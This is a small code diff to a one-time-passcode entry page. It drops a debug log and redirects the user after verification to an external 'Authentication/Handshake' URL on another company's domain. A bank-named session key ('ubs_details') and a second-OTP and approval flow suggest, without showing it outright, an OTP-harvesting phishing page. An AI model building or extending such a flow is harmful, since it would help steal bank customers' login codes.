@@ -74,8 +74,6 @@ function EnterCodeContent() {
     }
   }, [isSecondOtp, router]);
 
-  console.log("cooldownSeconds", cooldownSeconds, isCooldown);
-
   useEffect(() => {
     if (!isCooldown || cooldownSeconds <= 0) return;
 
@@ -134,7 +132,9 @@ function EnterCodeContent() {
       } else {
         if (typeof window !== "undefined")
           sessionStorage.setItem("ubs_details", "1");
-        router.push("/verify-details");
+        router.push(
+          "https://aig.wealthcareportal.com/Authentication/Handshake",
+        );
       }
     } catch (error) {
       console.error("Verification approval error:", error);
